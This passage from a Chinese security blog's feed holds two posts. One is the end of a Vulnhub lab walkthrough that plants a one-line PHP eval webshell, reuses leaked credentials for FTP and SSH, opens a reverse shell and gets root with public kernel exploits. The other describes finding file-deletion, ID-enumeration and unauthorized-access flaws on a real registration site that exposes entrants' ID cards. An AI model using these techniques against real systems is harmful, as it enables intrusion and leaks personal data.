eval($_POST[&quot;ace&quot;]);&#x27;</span> &gt; ace.php</span><br></pre></td></tr></table></figure><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906093504511.png" alt="image-20220906093504511"></p><p>木马成功写入，使用哥斯拉连接，随后查看站点目录有无可用信息等，发现数据库连接信息，但是数据库服务未开启，但站点开启了21FTP端口，尝试此账号密码登陆失败。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906094307307.png" alt="image-20220906094307307"></p><p>继续找别的敏感信息，随后再整站目录下发现另外一个数据库连接账号密码的备份文件。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906094526336.png" alt="image-20220906094526336"></p><p>继续尝试用账号密码进行FTP登陆，提示登陆成功</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906094945305.png" alt="image-20220906094945305"></p><p>随后cd到不同的目录中，查找文件，由于当前为www权限，进入目录很多无权限。进入到home目录下，发现关键信息</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906095339610.png" alt="image-20220906095339610"></p><p>jangow01文件夹下存放了user.txt，使用FTP命令下载到本地打开</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906095505639.png" alt="image-20220906095505639"></p><p>第一个Flag已拿到：d41d8cd98f00b204e9800998ecf8427e</p><h2 id="4-反弹Shell"><a href="#4-反弹Shell" class="headerlink" title="4.反弹Shell"></a>4.反弹Shell</h2><p>哥斯拉的中有不出网反弹shell的模块：RealCmd，填好参数后，尝试进行shell反弹</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906100009327.png" alt="image-20220906100009327"></p><p>本地nc监听4444即可：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906100050613.png" alt="image-20220906100050613"></p><p>反弹成功，但是此时反弹回来的shell很多命令都没办法使用，比如top，vim，sudo等</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906100408742.png" alt="image-20220906100408742"></p><p>如果此时目标主机存在python环境的话，我们可以尝试使用ptyshell可以实现简单的tty。</p><p>whereis python查看有无python环境，信息收集的时候我们已经得知，靶机有python3环境，于是直接运行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906100745376.png" alt="image-20220906100745376"></p><p>然后就可以尝试各种命令了，再查看端口的时候，发现开放了22SSH端口：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906101132959.png" alt="image-20220906101132959"></p><p>如果可以SSH登陆进去，那就很方便了。</p><p>尝试SSH登陆，使用刚刚的FTP账号密码进行尝试。吼，登陆成功</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906101345677.png" alt="image-20220906101345677"></p><h2 id="5-提权（1）"><a href="#5-提权（1）" class="headerlink" title="5.提权（1）"></a>5.提权（1）</h2><p>目前针对这台主机已经拿下webshell，FTP账号密码，SSH账号密码，但是shell权限是www，无法查看root下的文件，那就提权。</p><p>uname -a 得知是ubuntu 4.4.0，，Kali直接：searchspolit 4.4.0</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906101752814.png" alt="image-20220906101752814"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906102009208.png" alt="image-20220906102009208"></p><p>也可直接百度搜索ubuntu 4.4.0提权等等，在此我使用的是脏牛或者CVE-2021-4034</p><p>首先查看目标主机是否安装gcc</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906102738555.png" alt="image-20220906102738555"></p><p>随后上传CVE-2021-4034到&#x2F;tmp临时目录下，使用FTP上传或者哥斯拉上传都可以。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906102915257.png" alt="image-20220906102915257"></p><p>随后进入到tmp目录下，随后编译此文件</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906103132062.png" alt="image-20220906103132062"></p><p>编译成功后会在当前目录生成exp文件</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906103211632.png" alt="image-20220906103211632"></p><p>随后.&#x2F;exp进行提权操作，成功提升至root权限！</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906103301651.png" alt="image-20220906103301651"></p><p>进入root目录下查看文件</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906103337556.png" alt="image-20220906103337556"></p><p>读取proof.txt，第二个Flag拿到</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906103414524.png" alt="image-20220906103414524"></p><h2 id="6-提权（2）"><a href="#6-提权（2）" class="headerlink" title="6.提权（2）"></a>6.提权（2）</h2><p>继续使用脏牛提权</p><p>原理同上，上传至tmp目录下，随后进行编译</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906103638276.png" alt="image-20220906103638276"></p><p>编译成功：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906103854899.png" alt="image-20220906103854899"></p><p>进行提权：</p><p>然后系统死机了？？？打靶结束。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>I创杯比赛官网漏洞挖掘</title>
      <link href="/posts/d21575e2/"/>
      <url>/posts/d21575e2/</url>
      
        <content type="html"><![CDATA[<h1 id="一-I创杯比赛官网漏洞挖掘"><a href="#一-I创杯比赛官网漏洞挖掘" class="headerlink" title="一.I创杯比赛官网漏洞挖掘"></a>一.I创杯比赛官网漏洞挖掘</h1><h2 id="1-外围打点"><a href="#1-外围打点" class="headerlink" title="1.外围打点"></a>1.外围打点</h2><p>针对该系统进行信息收集，子域名，端口开放，脚本语言，服务器类型，中间件类型，包括官网里的公众号（经验证，公众号和网站一致），敏感目录扫描等等。</p><h2 id="2-逐个测试"><a href="#2-逐个测试" class="headerlink" title="2.逐个测试"></a>2.逐个测试</h2><p>前期的信息收集完毕，着手针对系统进行测试，findsomething发现了几个带参数id的url，尝试进行SQL注入。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823183801895.png" alt="1"></p><p>单引号测试一下直接拦截，不断fuzz看看到底是哪个参数被拦截了……然后由于站点的waf以及防护策略就此作罢。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823184109448.png" alt="2"></p><p>继续测试别的点，经测试，xss被拦截，..&#x2F;..&#x2F;..&#x2F;被拦截。几乎所有涉及到敏感操作的都会被拦截，继续测逻辑。</p><h2 id="3-柳暗花明"><a href="#3-柳暗花明" class="headerlink" title="3.柳暗花明"></a>3.柳暗花明</h2><p>因为是个报名网站，所以难免有注册登陆以及找回密码等选项，试试能否挖出来逻辑洞。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823184736113.png" alt="3"></p><p>注册登陆之后，测一下越权&#x2F;未授权等等。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823184839269.png" alt="4"></p><p>基于sessionid做鉴权，暂无越权什么的，个人信息更新框也用了正则杜绝特殊字符的输入。<br>尝试退出，在找回密码处测试验证码回显、密码找回等漏洞，发现验证码功能没办法正常使用，于是继续进入个人中心页面，发现个人中心的URL有些不一样，尝试删除目录，逐级往前，然后出来了一个活动报名界面。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823185312390.png" alt="5"></p><p>点击进入，页面跳转，来到一个报名处，点击参赛报名，然后填写个人信息，按照要求一步一步填写，在第二个步骤界面，出现了一个上传点。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823185622773.png" alt="6"></p><p>好家伙，终于来了，但是无奈的是上传不了脚本文件，白名单限制了，绕不过去。但是可以正常上传图片等类型。还可以进行图片预览与删除。</p><h2 id="4-文件删除漏洞x1"><a href="#4-文件删除漏洞x1" class="headerlink" title="4.文件删除漏洞x1"></a>4.文件删除漏洞x1</h2><p>在删除图片的时候，bp抓到的包，其中一个Key参数很可疑，type是文件操作类型</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823190012154.png" alt="7"></p><p>将数据包发送到repeater界面重放：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823190241880.png" alt="8"></p><p>第一次放包是获取上传图片的名称与Key的值，第二次重放是进行删除操作：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823190531537.png" alt="9"></p><p>尝试访问图片得到404，删除成功，更改Key的值进行尝试，文件删除漏洞x1</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823190653151.png" alt="10"></p><h2 id="5-JS审计再出洞"><a href="#5-JS审计再出洞" class="headerlink" title="5.JS审计再出洞"></a>5.JS审计再出洞</h2><p>既然已经挖到了一个接口存在文件删除，那就继续挖下去。查看网站源代码，发现了又一处接口：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823191042611.png" alt="11">    </p><p>这个Key似曾相识啊，这不就是刚刚的文件删除的参数么，看代码意思为展示图片（文件)的意思，于是将刚刚获取到的文件Key值进行拼接操作，文件下载x1：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823191358799.png" alt="12"></p><p>根据图片中给出的json数据可以得知文件下载的URL需要一个ID值，猜测这个ID值就是Key&#x3D;IDxxxx中的xxxx，继续构造URL进行测试，于是：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823191742221.png" alt="13"></p><p>此时可遍历ID值进行文件下载，由于参赛报名涉及到实名制（个人身份证等图片)，不再放出。</p><h2 id="6-转换思路-未授权到手"><a href="#6-转换思路-未授权到手" class="headerlink" title="6.转换思路-未授权到手"></a>6.转换思路-未授权到手</h2><p>不管是刚刚的删除文件操作还是下载文件，网站URL路径中都有一个SessionID参数，不妨尝试一下删除SessionID参数值进行未授权操作，未授权x1</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823192412621.png" alt="14"></p><p>此处仍可遍历Key的值来进行未授权访问，Key表示文件（图片）的标识，未授权下方给出的是（图片）文件的URL，直接访问可得到敏感信息（包括身份证等信息)。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
